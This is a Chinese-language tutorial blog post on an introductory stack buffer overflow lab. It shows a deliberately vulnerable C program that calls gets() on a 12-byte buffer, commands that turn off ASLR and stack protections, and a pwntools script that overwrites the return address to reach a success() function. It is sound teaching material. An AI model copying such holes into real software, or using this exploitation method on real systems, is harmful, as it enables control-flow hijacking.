ailx10说：这篇是我2024年4月写的。为了把栈溢出看得更直观，我自己写了一个很小的 C 程序：十二字节缓冲区配上不限制长度的输入，再放一个 success 函数当目标。编成 32 位程序、调整实验保护后，我用 IDA 和 GDB 实际量栈上的距离，最后才用 pwntools 改返回地址。这篇最想留下的是“偏移怎么来的”，不是某个固定数字。自己造一个小样本的好处就在这里：输入、局部变量和返回地址都能摆在眼前，改一点、再跑一遍，就能看见那段数据是怎样越过原来边界的。

---

这是缓冲区溢出入门实验，我们有一段C语言程序，程序的本意是输入一段字符串，然后展示它，但是没有对输入字符串的长度做限制，造成缓冲区溢出漏洞。首先将其编译成可执行程序，然后进行溢出实验。

原实验为演示关闭栈保护、PIE 和地址随机化；系统级 ASLR 设置会影响其他进程，只应在隔离环境中使用。

```
echo 0 > /proc/sys/kernel/randomize_va_space



gcc -m32 -fno-stack-protector -no-pie 1.c -o 1
```

C语言程序代码如下：

```
#include <stdio.h>

#include <string.h>



void success(void)

{

    puts("You Hava already controlled it.");

}



void vulnerable(void)

{

    char s[12];

    gets(s);

    puts(s);

    return;

}



int main(int argc, char **argv)

{

    vulnerable();

    return 0;

}
```

![](/notes-assets/b115ae8e66a26807161a.webp)

（1）源代码数组长度为 12 字节；反编译显示大小和到帧指针的距离还受栈布局、对齐和工具推断影响，不能直接等同。

![](/notes-assets/a0511ca73f5c96638d15.webp)

注意：栈的增长方向是从高地址到低地址，缓冲区的增长方向是从低地址到高地址

![](/notes-assets/0070bbfec9d25bbb0ad3.webp)

（2）原样本中的 success 函数地址为 0x80491B6；重新编译后地址可能变化。

![](/notes-assets/7ac729b80afe2f944eda.webp)

（3）原记录使用 pwntools 调整输入并观察到执行流变化；偏移和地址需对实际构建重新测量。

```
from pwn import *



# 构造与程序交互的对象

sh = process('./1')

success_addr = 0x80491B6



# 构造payload

payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)

print(p32(success_addr))



# 向程序发送字符串

sh.sendline(payload)



# 将代码交互转换为手工交互

sh.interactive()
```

![](/notes-assets/f4c7f7b938e6686e7473.webp)

把返回位置改到success只是最后一小步，前面的定位才是练习主体。以后换编译器或保护设置，重新量一遍，也比把这次的数字当成固定公式更可靠。
